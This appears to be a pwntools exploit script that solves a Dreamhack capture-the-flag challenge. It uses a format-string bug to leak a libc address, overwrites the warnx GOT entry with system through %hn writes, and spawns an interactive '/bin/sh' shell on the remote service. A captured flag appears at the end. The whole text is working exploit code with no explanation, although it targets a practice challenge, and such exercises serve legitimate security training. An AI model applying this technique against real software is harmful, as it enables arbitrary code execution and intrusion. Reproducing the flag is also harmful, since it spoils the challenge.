from pwn import * 

local = 0

warnx_got = 0x0804a02c 

if local == 1:
    p = process("./string")
    libc_offset = 0x18e91
    system_offset = 0x3cd80
else : 
    p = remote("host1.dreamhack.games",8500)
    libc_offset = 0x18637
    system_offset = 0x3a940

p.sendlineafter(">",str(1))
p.sendlineafter("Input:","%71$x")

p.sendlineafter(">",str(2))
p.recvuntil("string:")
libc_base = int(p.recvline()[1:-1],16) - libc_offset
log.info(hex(libc_base))

system = libc_base + system_offset

system1 = int(hex(system)[-4:],16)
system2 = int(hex(system)[2:-4],16)


log.info(hex(system))

payload = ""
payload += p32(warnx_got)
payload += "a"*4
payload += p32(warnx_got+2)
payload += "%x "*3
payload += "%"+str(system1-0x27)+"c "
payload += "%hn "
payload += "%"+str(system2-system1-2)+"c "
payload += "%hn "

p.sendlineafter(">",str(1))
p.sendlineafter("Input:",payload)


p.sendlineafter(">",str(2))

p.sendlineafter(">",str(1))
p.sendlineafter("Input:","/bin/sh\x00")

p.interactive()

#DH{1166af5ed1d5cd46d4ec50d7d8862796}